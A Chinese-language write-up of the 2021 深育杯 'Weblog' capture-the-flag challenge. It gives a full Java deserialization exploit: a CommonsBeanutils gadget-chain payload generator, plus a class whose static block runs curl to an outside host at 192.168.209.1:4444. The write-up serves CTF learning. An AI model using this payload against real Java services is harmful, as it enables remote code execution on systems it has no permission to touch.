# 深育杯 Weblog

## Ref

- [2021深育杯线上初赛官方WriteUp - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10533#toc-3)

## 考点

- 任意文件读取
- Java 反序列化

## WalkThrough

首先根据提示读取日志文件，读取当天的日志得到jar包的位置，下载后得到源代码

发现`readObject()`反序列化接口

```java
@RequestMapping({"/bZdWASYu4nN3obRiLpqKCeS8erTZrdxx/parseUser"})
@ResponseBody
public String getUser(String user) throws Exception {
    byte[] userBytes = Base64.getDecoder().decode(user.getBytes());
    ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(userBytes));
    User userObj = (User) in.readObject();
    return userObj.getUserNicename();
}
```

检查`pom.xml`依赖，发现有，但是ysoserial里的内置链还是无法使用

```xml
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.8.2</version>
</dependency>
```

可见都无法满足依赖

```
CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
```

这里可以用phithon挖掘出的一条`commons-beanutils`不依赖`commons-collections`的反序列化利用链

[CommonsBeanutils与无commons-collections的Shiro反序列化利用 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html)

> 增加main函数部分

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

import static org.apache.commons.beanutils.PropertyUtils.setProperty;

public class CommonsBeanutils1Shiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(worker.class.getName());
        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());
        String p = Base64.getEncoder().encodeToString(payloads);
        System.out.println(p);
    }
}
```

worker.java

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class worker extends AbstractTranslet{
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"bash","-c","curl 192.168.209.1:4444"});
        } catch (Exception e) {
            // 忽略错误，在生成生成序列化代码时也会执行static部分，必然报错，直接跳过即可
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

flag不在常见位置，需要自行寻找